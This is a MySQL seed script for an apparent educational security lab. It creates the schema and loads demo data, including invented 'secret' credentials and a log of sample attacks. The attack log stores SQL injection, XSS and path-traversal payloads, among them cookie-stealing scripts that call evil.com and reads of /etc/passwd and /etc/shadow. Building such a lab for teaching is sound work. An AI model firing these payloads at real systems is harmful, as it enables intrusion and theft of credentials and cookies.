-- ============================================================
-- Security Lab Database v2 — Educational purposes only
-- ============================================================
CREATE DATABASE IF NOT EXISTS security_lab CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE security_lab;

SET FOREIGN_KEY_CHECKS = 0;
DROP TABLE IF EXISTS audit_trail;
DROP TABLE IF EXISTS sessions;
DROP TABLE IF EXISTS attack_logs;
DROP TABLE IF EXISTS secret_data;
DROP TABLE IF EXISTS comments;
DROP TABLE IF EXISTS products;
DROP TABLE IF EXISTS users;
SET FOREIGN_KEY_CHECKS = 1;

-- ─── Table users ──────────────────────────────────────────────────────────────
CREATE TABLE users (
  id         INT AUTO_INCREMENT PRIMARY KEY,
  username   VARCHAR(50)  NOT NULL UNIQUE,
  password   VARCHAR(255) NOT NULL,
  email      VARCHAR(100),
  role       ENUM('admin','user','moderator') DEFAULT 'user',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  last_login TIMESTAMP NULL
);

-- ─── Table sessions ───────────────────────────────────────────────────────────
CREATE TABLE sessions (
  id         INT AUTO_INCREMENT PRIMARY KEY,
  user_id    INT          NOT NULL,
  token_hash VARCHAR(64)  NOT NULL UNIQUE,
  ip         VARCHAR(45),
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  expires_at TIMESTAMP NOT NULL,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- ─── Table audit_trail ────────────────────────────────────────────────────────
CREATE TABLE audit_trail (
  id         INT AUTO_INCREMENT PRIMARY KEY,
  user_id    INT          NULL,
  action     VARCHAR(100) NOT NULL,
  target     VARCHAR(200),
  ip         VARCHAR(45),
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_user_id  (user_id),
  INDEX idx_created  (created_at)
);

-- ─── Table products ───────────────────────────────────────────────────────────
CREATE TABLE products (
  id          INT AUTO_INCREMENT PRIMARY KEY,
  name        VARCHAR(100) NOT NULL,
  category    VARCHAR(50),
  price       DECIMAL(10,2) NOT NULL,
  description TEXT,
  stock       INT DEFAULT 0,
  is_secret   BOOLEAN DEFAULT FALSE
);

-- ─── Table comments ───────────────────────────────────────────────────────────
CREATE TABLE comments (
  id            INT AUTO_INCREMENT PRIMARY KEY,
  author        VARCHAR(50) NOT NULL,
  content       TEXT NOT NULL,
  endpoint_type ENUM('vulnerable','secure') DEFAULT 'vulnerable',
  created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ─── Table attack_logs ────────────────────────────────────────────────────────
CREATE TABLE attack_logs (
  id          INT AUTO_INCREMENT PRIMARY KEY,
  attack_type ENUM('SQL_INJECTION','XSS','CSRF','BRUTE_FORCE','PATH_TRAVERSAL','OTHER') NOT NULL,
  payload     TEXT,
  endpoint    VARCHAR(200),
  ip_address  VARCHAR(45) DEFAULT '127.0.0.1',
  user_agent  TEXT,
  status      ENUM('DETECTED','BLOCKED','PASSED') NOT NULL DEFAULT 'DETECTED',
  severity    ENUM('LOW','MEDIUM','HIGH','CRITICAL') NOT NULL DEFAULT 'HIGH',
  points      INT DEFAULT 5,
  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_type      (attack_type),
  INDEX idx_severity  (severity),
  INDEX idx_created   (created_at)
);

-- ─── Table secret_data ────────────────────────────────────────────────────────
CREATE TABLE secret_data (
  id             INT AUTO_INCREMENT PRIMARY KEY,
  data_key       VARCHAR(100) NOT NULL,
  data_value     TEXT NOT NULL,
  classification ENUM('PUBLIC','INTERNAL','CONFIDENTIAL','TOP_SECRET') DEFAULT 'CONFIDENTIAL'
);

-- ============================================================
-- DONNÉES DE DÉMO
-- ============================================================

-- ─── Compte administrateur ────────────────────────────────────────────────────
-- Le mot de passe 'SEED_ON_START' est remplacé par le hash bcrypt au démarrage.
INSERT INTO users (username, password, email, role) VALUES
('admin', 'SEED_ON_START', 'admin@seclab.local', 'admin');

-- ─── Produits ─────────────────────────────────────────────────────────────────
INSERT INTO products (name, category, price, description, stock, is_secret) VALUES
('iPhone 15 Pro',            'Smartphones', 999.99,  'Apple flagship with titanium design',     50,  FALSE),
('MacBook Pro M3',           'Laptops',    2499.99,  'Professional laptop with M3 chip',        25,  FALSE),
('Dell XPS 15',              'Laptops',    1299.99,  'Premium Windows ultrabook',               30,  FALSE),
('AirPods Pro 2',            'Audio',       249.99,  'Active noise-canceling earbuds',         100,  FALSE),
('Samsung Galaxy S24 Ultra', 'Smartphones',1199.99,  'Android flagship with S Pen',             45,  FALSE),
('Sony WH-1000XM5',          'Audio',       349.99,  'Industry-leading noise canceling',        60,  FALSE),
('iPad Pro 12.9',            'Tablets',    1099.99,  'Pro tablet with M2 chip',                 35,  FALSE),
('Logitech MX Keys',         'Peripherals', 119.99,  'Advanced wireless keyboard',              80,  FALSE),
('LG 27 4K Monitor',         'Displays',    599.99,  'Ultra HD IPS display',                    20,  FALSE),
('Anker USB-C Hub',          'Accessories',  49.99,  '10-in-1 USB-C hub',                      150,  FALSE),
('CLASSIFIED_SERVER_X7',     'Secret',        0.00,  'Internal server credentials — SECRET',     0,  TRUE),
('SECRET_ENCRYPTION_KEY',    'Secret',        0.00,  'AES-256 master encryption keys',           0,  TRUE);

-- ─── Données secrètes ─────────────────────────────────────────────────────────
INSERT INTO secret_data (data_key, data_value, classification) VALUES
('db_root_password',      'MySuperSecret@Root2024!',                   'TOP_SECRET'),
('production_api_key',    'pk_live_xxxxxxxxxxxxxxxxxxxxxxxxxxxx',       'TOP_SECRET'),
('admin_backup_password', 'Backup@Admin#2024',                         'CONFIDENTIAL'),
('smtp_credentials',      'smtp://admin:secret@mail.seclab.local:587', 'CONFIDENTIAL'),
('encryption_master_key', 'aes256:4f3a2b1c9d8e7f6a5b4c3d2e1f0a9b8c', 'TOP_SECRET'),
('ssh_key_fingerprint',   'SHA256:AbCdEfGhIjKlMnOpQrStUvWxYz',        'INTERNAL');

-- ─── Commentaires ─────────────────────────────────────────────────────────────
INSERT INTO comments (author, content, endpoint_type) VALUES
('Alice',   'Great security platform! Very educational.',              'secure'),
('Bob',     'Learned so much about SQL injection here.',              'secure'),
('Charlie', 'XSS vulnerabilities are more dangerous than I thought.', 'secure');

-- ─── Journaux d'attaques (données historiques pour la démonstration) ──────────
INSERT INTO attack_logs (attack_type, payload, endpoint, ip_address, status, severity, points, created_at) VALUES
-- Jour 7
('SQL_INJECTION', "' OR '1'='1",                                    '/api/auth/login-vulnerable',   '192.168.1.100', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 7 DAY)),
('SQL_INJECTION', "admin'--",                                        '/api/auth/login-vulnerable',   '10.0.0.15',     'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 7 DAY) + INTERVAL 1 HOUR),
('XSS',           '<script>alert("XSS")</script>',                  '/api/xss/comment-vulnerable',  '172.16.0.50',   'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 7 DAY) + INTERVAL 2 HOUR),
('XSS',           '<img src=x onerror=alert(1)>',                   '/api/xss/reflect-vulnerable',  '192.168.1.200', 'PASSED',   'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 7 DAY) + INTERVAL 3 HOUR),
('BRUTE_FORCE',   'Multiple failed login attempts',                  '/api/brute/login-secure',      '10.10.10.5',    'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 7 DAY) + INTERVAL 4 HOUR),
('SQL_INJECTION', "' UNION SELECT 1,username,password,4,5 FROM users--", '/api/sqli/search-vulnerable', '192.168.1.100', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 7 DAY) + INTERVAL 5 HOUR),
('XSS',           '<svg onload=fetch("http://evil.com/steal")>',    '/api/xss/comment-vulnerable',  '172.16.0.55',   'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 7 DAY) + INTERVAL 6 HOUR),
('PATH_TRAVERSAL','../../etc/passwd',                                '/api/files/read-vulnerable',   '10.0.0.22',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 7 DAY) + INTERVAL 7 HOUR),
-- Jour 6
('SQL_INJECTION', '1 OR 1=1',                                       '/api/sqli/product-vulnerable', '192.168.1.101', 'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 6 DAY)),
('XSS',           '<script>document.location="http://evil.com"</script>', '/api/xss/reflect-vulnerable', '10.0.0.20', 'BLOCKED', 'HIGH', 50, DATE_SUB(NOW(), INTERVAL 6 DAY) + INTERVAL 2 HOUR),
('SQL_INJECTION', "'; DROP TABLE users;--",                          '/api/sqli/search-vulnerable',  '172.16.0.60',   'BLOCKED',  'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 6 DAY) + INTERVAL 3 HOUR),
('CSRF',          'Transfer 5000 DZD without CSRF token',           '/api/csrf/transfer-vulnerable', '192.168.100.1', 'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 6 DAY) + INTERVAL 4 HOUR),
('XSS',           '<body onload=alert("stored")>',                  '/api/xss/comment-vulnerable',  '10.0.0.25',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 6 DAY) + INTERVAL 5 HOUR),
('SQL_INJECTION', "' OR username='admin'--",                        '/api/auth/login-vulnerable',   '192.168.1.102', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 6 DAY) + INTERVAL 6 HOUR),
('PATH_TRAVERSAL','../../../etc/shadow',                             '/api/files/read-vulnerable',   '10.0.0.33',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 6 DAY) + INTERVAL 7 HOUR),
-- Jour 5
('XSS',           'javascript:alert(document.domain)',               '/api/xss/reflect-vulnerable',  '10.0.0.30',     'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 5 DAY)),
('BRUTE_FORCE',   'Password spray attack detected',                  '/api/brute/login-secure',      '172.16.0.70',   'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 5 DAY) + INTERVAL 3 HOUR),
('SQL_INJECTION', "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--", '/api/sqli/search-vulnerable', '192.168.1.103', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 5 DAY) + INTERVAL 5 HOUR),
('XSS',           '<iframe src="javascript:alert(1)">',             '/api/xss/comment-vulnerable',  '10.0.0.35',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 5 DAY) + INTERVAL 7 HOUR),
('PATH_TRAVERSAL','../config/database.php',                          '/api/files/read-vulnerable',   '172.16.0.88',   'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 5 DAY) + INTERVAL 8 HOUR),
('CSRF',          'Invalid CSRF token submitted',                    '/api/csrf/transfer-secure',    '10.0.0.44',     'BLOCKED',  'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 5 DAY) + INTERVAL 9 HOUR),
-- Jour 4
('SQL_INJECTION', '1 AND SLEEP(5)',                                  '/api/sqli/product-vulnerable', '192.168.1.104', 'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 4 DAY)),
('XSS',           '<script>new Image().src="http://evil.com/log?k="+document.cookie</script>', '/api/xss/comment-vulnerable', '10.0.0.40', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 2 HOUR),
('SQL_INJECTION', "admin' OR '1'='1'--",                            '/api/auth/login-vulnerable',   '172.16.0.80',   'PASSED',   'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 3 HOUR),
('BRUTE_FORCE',   '5 failed attempts in 30 seconds',                '/api/brute/login-vulnerable',  '192.168.200.1', 'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 4 HOUR),
('XSS',           '<input autofocus onfocus=alert(1)>',             '/api/xss/reflect-vulnerable',  '10.0.0.45',     'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 6 HOUR),
('PATH_TRAVERSAL','%2e%2e%2fetc%2fpasswd',                           '/api/files/read-vulnerable',   '10.0.0.55',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 7 HOUR),
-- Jour 3
('BRUTE_FORCE',   'Rate limit exceeded: 50 requests in 60s',        '/api/auth/login-vulnerable',   '10.0.0.50',     'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 3 DAY)),
('XSS',           '<details open ontoggle=alert(1)>',               '/api/xss/comment-vulnerable',  '172.16.0.90',   'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 3 DAY) + INTERVAL 3 HOUR),
('SQL_INJECTION', "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='A'--", '/api/sqli/product-vulnerable', '192.168.1.106', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 3 DAY) + INTERVAL 5 HOUR),
('CSRF',          'Transfer forged from malicious-site.com',        '/api/csrf/transfer-vulnerable', '10.20.30.55',  'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 3 DAY) + INTERVAL 6 HOUR),
('SQL_INJECTION', "1; SELECT * FROM secret_data--",                 '/api/sqli/search-vulnerable',  '10.0.0.60',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 3 DAY) + INTERVAL 7 HOUR),
('PATH_TRAVERSAL','C:\\Windows\\win.ini',                            '/api/files/read-vulnerable',   '192.168.1.115', 'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 3 DAY) + INTERVAL 8 HOUR),
-- Jour 2
('XSS',           '<script>eval(atob("YWxlcnQoMSk="))</script>',    '/api/xss/comment-vulnerable',  '192.168.1.107', 'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY)),
('SQL_INJECTION', "admin'; WAITFOR DELAY '0:0:5'--",                '/api/auth/login-vulnerable',   '10.0.0.60',     'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 2 HOUR),
('CSRF',          'Missing CSRF token on transfer action',          '/api/csrf/transfer-vulnerable', '172.16.0.100',  'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 3 HOUR),
('XSS',           '<object data="javascript:alert(1)">',            '/api/xss/reflect-vulnerable',  '192.168.1.108', 'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 5 HOUR),
('SQL_INJECTION', "' OR EXISTS(SELECT * FROM users WHERE username='admin')--", '/api/sqli/search-vulnerable', '10.0.0.65', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 6 HOUR),
('BRUTE_FORCE',   'Dictionary attack: 200 attempts',                '/api/brute/login-secure',      '172.16.0.110',  'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 7 HOUR),
('PATH_TRAVERSAL','../../../proc/version',                           '/api/files/read-vulnerable',   '10.0.0.77',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 8 HOUR),
-- Hier
('SQL_INJECTION', "'; INSERT INTO users(username,password) VALUES('pwned','hacked')--", '/api/sqli/product-vulnerable', '192.168.1.109', 'BLOCKED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 1 DAY)),
('XSS',           '<script src="http://evil.com/xss.js"></script>', '/api/xss/comment-vulnerable',  '10.0.0.70',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 1 HOUR),
('BRUTE_FORCE',   'Account lockout triggered',                      '/api/brute/login-secure',      '172.16.0.110',  'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 2 HOUR),
('SQL_INJECTION', "' UNION SELECT 1,data_key,data_value,4,5 FROM secret_data--", '/api/sqli/search-vulnerable', '192.168.1.110', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 4 HOUR),
('CSRF',          'Forged transfer: amount=99999&to=attacker',      '/api/csrf/transfer-vulnerable', '10.20.30.99',   'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 5 HOUR),
('PATH_TRAVERSAL','../../etc/hosts',                                 '/api/files/read-vulnerable',   '172.16.1.10',   'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 6 HOUR),
('OTHER',         'Suspicious scanner UA: sqlmap/1.7.8',            '/api/sqli/search-vulnerable',  '192.168.1.111', 'DETECTED', 'LOW',      5,   DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 7 HOUR),
-- Aujourd'hui
('SQL_INJECTION', "' OR '1'='1",                                    '/api/auth/login-vulnerable',   '192.168.1.112', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 2 HOUR)),
('XSS',           '<script>alert(document.cookie)</script>',        '/api/xss/comment-vulnerable',  '10.0.0.80',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 90 MINUTE)),
('SQL_INJECTION', "1; DROP TABLE products;--",                      '/api/sqli/product-vulnerable', '172.16.0.120',  'BLOCKED',  'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 60 MINUTE)),
('BRUTE_FORCE',   '5 failed login attempts in 2 minutes',           '/api/brute/login-vulnerable',  '192.168.1.113', 'BLOCKED',  'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 30 MINUTE)),
('PATH_TRAVERSAL','../../../../etc/passwd',                          '/api/files/read-vulnerable',   '10.0.0.90',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 20 MINUTE)),
('CSRF',          'Transfer 2500 DZD — no CSRF token',             '/api/csrf/transfer-vulnerable', '10.0.0.95',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 10 MINUTE)),
('XSS',           '<img src=1 href=1 onerror=javascript:alert(1)>', '/api/xss/reflect-vulnerable',  '10.0.0.85',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 5 MINUTE)),
('SQL_INJECTION', "admin' AND SLEEP(3)--",                          '/api/auth/login-vulnerable',   '192.168.1.114', 'DETECTED', 'HIGH',     50,  NOW());
